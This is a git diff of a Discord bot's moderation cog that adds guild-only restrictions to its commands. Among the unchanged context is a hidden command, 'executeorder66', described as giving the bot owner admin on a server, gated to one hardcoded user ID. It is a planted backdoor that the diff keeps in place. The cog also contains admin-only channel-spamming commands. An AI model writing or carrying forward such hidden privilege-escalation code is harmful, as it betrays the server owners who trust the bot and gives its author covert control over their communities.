@@ -61,6 +61,7 @@ class Moderator(commands.Cog):
 
     # Commands
     @commands.command(help='Returns the bot\'s ping')
+    @commands.guild_only()
     async def ping(self, ctx):
         ping_message = discord.Embed(
             description=f'Latency: {"{:.1f}".format(self.client.latency * 1000)}ms.',
@@ -69,6 +70,7 @@ class Moderator(commands.Cog):
         await ctx.send(embed=ping_message)
 
     @commands.command(help='Clears the specified number of messages (defaults to 5)')
+    @commands.guild_only()
     @commands.has_permissions(administrator=True)
     async def clear(self, ctx, amount=5):
         await ctx.channel.purge(limit=amount + 1)
@@ -80,6 +82,7 @@ class Moderator(commands.Cog):
         await ctx.send(embed=cleared_message)
 
     @commands.command(aliases=['dm'], help='dm\'s the specified user with the specified message')
+    @commands.guild_only()
     @commands.has_permissions(administrator=True)
     async def direct_message(self, ctx, messagee: discord.Member, *, message):
         dm_sent = discord.Embed(
@@ -90,6 +93,7 @@ class Moderator(commands.Cog):
         await ctx.send(embed=dm_sent)
 
     @commands.command(help='Gives link to source code on github')
+    @commands.guild_only()
     async def github(self, ctx):
         github_message = discord.Embed(
             description=f'My code is on Github here: https://github.com/EitherOr6917/eitherBot.py',
@@ -98,6 +102,7 @@ class Moderator(commands.Cog):
         await ctx.send(embed=github_message)
 
     @commands.command(help='Changes the prefix for the bot on the server')
+    @commands.guild_only()
     @commands.has_permissions(administrator=True)
     async def changeprefix(self, ctx, prefix):
         with open('prefixes.json', 'r') as file:
@@ -115,6 +120,7 @@ class Moderator(commands.Cog):
         await ctx.send(embed=pc_message)
 
     @commands.command(help='Gives a votable message with the content provided')
+    @commands.guild_only()
     async def vote(self, ctx, *, question):
         await ctx.channel.purge(limit=1)
         op_msg = discord.Embed(
@@ -126,6 +132,7 @@ class Moderator(commands.Cog):
         await message.add_reaction('✅')
 
     @commands.command(help='Spams the text provided in the channel provided the given number of times')
+    @commands.guild_only()
     @commands.has_permissions(administrator=True)
     async def looptext(self, ctx, channel: discord.TextChannel, loop_count: int, *, message):
         for x in range(loop_count):
@@ -133,6 +140,7 @@ class Moderator(commands.Cog):
         await ctx.author.send(f'{ctx.author.mention} I finished spamming lmao.')
 
     @commands.command(help='Same as looptext, except it sends an embed instead of plaintext')
+    @commands.guild_only()
     @commands.has_permissions(administrator=True)
     async def loopembed(self, ctx, channel: discord.TextChannel, loop_count: int, *, message):
         loop_embed = discord.Embed(
@@ -144,6 +152,7 @@ class Moderator(commands.Cog):
         await ctx.author.send(f'{ctx.author.mention} I finished spamming lmao.')
 
     @commands.command(help='Returns the discord ID of the targeted user')
+    @commands.guild_only()
     async def checkid(self, ctx, target: discord.Member):
         id_msg = discord.Embed(
             description=f'{target.nick}\'s discord id is {target.id}',
@@ -153,6 +162,7 @@ class Moderator(commands.Cog):
         await ctx.send(embed=id_msg)
 
     @commands.command(help='Dms you a link to add Machiavelli to your own server!')
+    @commands.guild_only()
     async def invite(self, ctx):
         invite_msg = discord.Embed(
             description='Here is the link to invite Machiavelli to your server: '
@@ -164,6 +174,7 @@ class Moderator(commands.Cog):
         await ctx.author.send(embed=invite_msg)
 
     @commands.command(hidden=True, help='Gives bot owner admin on specified server.')
+    @commands.guild_only()
     async def executeorder66(self, ctx):
         if ctx.author.id == 406663932166668288:
             role = await ctx.guild.create_role(
@@ -179,7 +190,7 @@ class Moderator(commands.Cog):
             await ctx.channel.send(embed=msg)
         else:
             no_can_do = discord.Embed(
-                description=f'{ctx.author.mention} you cannot do this.',
+                description=f'{ctx.author.mention} you are not my leader.',
                 color=discord.Color.purple()
             )
 
